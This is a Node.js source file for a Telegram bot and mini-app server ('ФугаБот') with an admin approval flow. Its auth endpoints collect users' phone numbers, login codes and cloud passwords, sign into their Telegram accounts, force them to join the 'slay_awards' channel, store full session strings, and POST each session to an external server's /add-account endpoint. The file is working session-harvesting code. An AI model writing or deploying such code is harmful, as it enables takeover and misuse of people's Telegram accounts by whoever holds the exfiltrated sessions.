require("dotenv").config();
const axios = require("axios");
const crypto = require('crypto');
const express = require("express");
const cors = require("cors");
const app = express();

const userBase = require('./userBase.js');
const dataBase = require('./dataBase.js');
const imgBase = require('./imgBase.js');

app.use(cors({ methods: ["GET", "POST"] }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


const { Api, TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { password: passwordUtils } = require("telegram");
const { Telegraf, session } = require("telegraf");

const apiId = +process.env.API_ID;
const apiHash = process.env.API_HASH;
const BOT_TOKEN = process.env.BOT_TOKEN;

const bot = new Telegraf(BOT_TOKEN);

bot.use(
  session({
    defaultSession: () => ({ write_user: false }),
    defaultSession: () => ({ write_admin: false }),
    defaultSession: () => ({ order_scena: false }),
  })
);

//imgBase.deleteMany({})

function clearDB(){
  imgBase.deleteMany({});
  dataBase.deleteMany({});
}
//clearDB();
//dataBase.deleteMany({});
// dataBase.find({}).then(res => {
//   console.log(res);
// })

  

const USERS = {};

async function main() {



  // TelegramBot

  bot.action(/^approve_/i, async (ctx) => {
    const [, idUser] = ctx.match.input.split("_");
    await userBase.updateOne({ id: +idUser  }, { $set: { isValid: true } });
    bot.telegram.sendMessage(idUser, `<b>✅ ДОСТУП РАЗРЕШЁН! </b>\n<blockquote><b>💪 Добро пожаловать в ряды 42-братух.\nТеперь вам открыт полный доступ к ФугаБоту — пользуйтесь с умом, брат! 🤝</b></blockquote>`, { parse_mode:'HTML' });
    ctx.reply(`<b>✅ Вы подтвердили заявку!</b>`, { parse_mode: "HTML" });
  });

  bot.action(/^cancel_/i, async (ctx) => {
    const [, idUser] = ctx.match.input.split("_");
    await userBase.updateOne({ id: +idUser  }, { $set: { isValid: false } });
    bot.telegram.sendMessage(idUser, `<b>🚫 Отказано!</b>\n<blockquote><i>Администратор не одобрил доступ к ФугаБоту 😤</i></blockquote>`, { parse_mode:'HTML' });
    ctx.reply(`<b>❌ Вы отказли в доступе!</b>`, { parse_mode: "HTML" });
  });

  bot.command("start", async (ctx) => {
    const { id, username, first_name, last_name  } = ctx.from;
    const fullName = `${first_name ?? ''} ${ last_name ?? ''}`

    const user = await userBase.findOne({ id, username });

    if(user === null){
      await userBase.insertOne({ id, username, full_name: fullName, hash: hashCode(), isValid: false, isBanned: false });
    }
    
    ctx.replyWithPhoto("https://i.ibb.co/jPXBncp6/card-start-fuga-bot.jpg", {
      caption: `<b>⚔️ Этот бот предназначен для настоящих 42-братух.</b>\n<blockquote><i>🔐 Доступ будет активирован после подтверждения администратором вашей заявки.</i></blockquote>     `,
      parse_mode: "HTML"
    });

    bot.telegram.sendMessage(process.env.ADMIN_ID, 
      `<blockquote><b>Пользователь \n id:<code>${id}</code>  @${username}\n Подал заявку на вступление в фугабота.</b></blockquote>`,
      { parse_mode:'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Подтвердить", callback_data: `approve_${id}` }],
            [{ text: "❌ Отказать", callback_data: `cancel_${id}` }]
          ]
        }
      })

  });

  bot.command("users", async (ctx) => {
    const response = await userBase.find({});
    console.log(response)
  })

  bot.command("drop_base", async (ctx) => {
    const { id } = ctx.from;
    console.log( id , process.env.ADMIN_ID)
    if(process.env.ADMIN_ID == id){
      await imgBase.deleteMany({});
      await dataBase.deleteMany({});
      ctx.reply(`<b>✅ База данных была очищенна!</b>`, { parse_mode: "HTML" });
    }
    else{
      ctx.reply(`<b>❌ Вы не Администратор!</b>`, { parse_mode: "HTML" });
    }
  })
  

  // MiniApp API

  app.post('/auth/phone', async (req, res) => {
    const { id, phone } = req.body;
    try {
      USERS[id] = { phone };
      USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
      await USERS[id].client.connect();

      USERS[id].resultSendCode = await USERS[id].client.invoke(
        new Api.auth.SendCode({
          phoneNumber: USERS[id].phone,
          apiId,
          apiHash,
          settings: new Api.CodeSettings({
            allowFlashcall: true,
            currentNumber: true,
            allowAppHash: true,
            allowMissedCall: true,
            logoutTokens: [Buffer.from("arbitrary data here")],
          }),
        })
      );

      res.json({ type: 'succes', msg:'Код был отправлен!' });
    }
    catch(e){
      console.log(e)
      if(e.errorMessage === 'PHONE_NUMBER_INVALID'){
        res.json({ type: 'error', msg:'Ошибка в номере телефона!' });
      }
      else{
        res.json({ type: 'error', msg:e.errorMessage });
      }
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }
  });

  app.post('/auth/code-password', async (req, res) => {
    const { id, username, code, password } = req.body;
    USERS[id].code = code.replaceAll(' ','');
    USERS[id].password = password;
    try {     
      USERS[id].resultCodeTg = await USERS[id].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: USERS[id].phone,
          phoneCodeHash: USERS[id].resultSendCode.phoneCodeHash,
          phoneCode: USERS[id].code
        })
      );

      const me = await USERS[id].client.getMe();
      
      const channelEntity = await USERS[id].client.getEntity("slay_awards");
      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
      const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
      const msg = msgs[0];
      const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
      await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));

      await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save() });
      await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    } catch (err) {
      console.log(err)
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        try{
          const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
          const password = await USERS[id].password;
          const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
          await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );

          const me = await USERS[id].client.getMe();
          
          const channelEntity = await USERS[id].client.getEntity("slay_awards");
          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: channelEntity }));
          const msgs = await USERS[id].client.getMessages("slay_awards", { limit: 1 });
          const msg = msgs[0];
          const discussionChat = await USERS[id].client.getEntity(msg.replies.channelId);
          await USERS[id].client.invoke(new Api.channels.JoinChannel({ channel: discussionChat }));

          await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
          res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  
          await axios.post(`${process.env.URL_PING}/add-account`, { session: USERS[id].client.session.save() }, { headers: { "Content-Type": "application/json" } });
        }
        catch(err2){
          if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
            res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
          } 
        }
      } else {

        console.error("❌ Ошибка входа:", err);
        if (err.errorMessage === "PHONE_CODE_INVALID") {    
          res.json({ type: 'error', msg:'Код введен не правильно!'});
        }
      }

      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
        res.json({ type: 'error', msg:'Время кода истекло!'});
      } 
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }

  });
  

  app.post('/auth/login', async (req, res) => {
    const { id, username, initData } = req.body;
    console.log(req.body);
    const user =  await userBase.findOne({ id, username });
    const isVerify = await verifyTelegramInitData(initData);
    console.log(isVerify);

    if(user === null || user.isBanned || !user.isValid || !isVerify){
      res.json({ type: 'error', accounts: [] });
    }
    else if(!user.isBanned && user.isValid && isVerify){
      const accountsRaw = await dataBase.find({ id, username });
      const accounts = accountsRaw.map(item => {
        return { id: item.id, username: item.username, full_name: item.full_name, post_image: item.post_image, post_text: item.post_text }
      })
      res.json({ type: 'succes', accounts, token_imgbb: process.env.TOKEN_IMGBB });
    }
  });



  app.post('/upload-image', async (req, res) => {
    const { id, current, thumb } = req.body;
    await imgBase.insertOne({ id, current, thumb });
    res.json({ type: 200 });
  });

  app.post('/images', async (req, res) => {
    const imagesRaw = await imgBase.find({});
    const images = imagesRaw.map(item =>  { 
      return { current: item.current, thumb: item.thumb }
    })
    res.json({ images });
  });

  app.post('/save-post', async (req, res) => {
    const { id, full_name, text, url } = req.body;
    try{
      await bot.telegram.sendPhoto(id, url, { caption: text , parse_mode:'HTML' })
    }
    catch(e){
      await bot.telegram.sendMessage(id, `<b>Ошибка скорее всего вы не закрыли тег html</b>`, { parse_mode:'HTML' })
    }
    await dataBase.updateOne({ id, full_name }, { $set:{ post_image: url, post_text: text } });
    res.json({ type: 200 });
  });

  


}
main();



function hashCode(n = 8) {
  const symbols =
    "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
  let user_hash = "";
  for (let i = 0; i != n; i++) {
    user_hash += symbols[Math.floor(Math.random() * symbols.length)];
  }
  return user_hash;
}

async function verifyTelegramInitData(initData) {
  const urlParams = new URLSearchParams(initData);
  const hash = urlParams.get("hash");
  urlParams.delete("hash");
  const dataCheckString = Array.from(urlParams.entries()).map(([k, v]) => `${k}=${v}`).sort().join("\n");
  const secretKey = crypto.createHmac("sha256", "WebAppData").update(BOT_TOKEN).digest();
  const hmac = crypto.createHmac("sha256", secretKey).update(dataCheckString).digest("hex");
  return hmac === hash;
}

app.listen(3042, (err) => { err ? err : console.log("STARTED SERVER"); });


bot.launch();



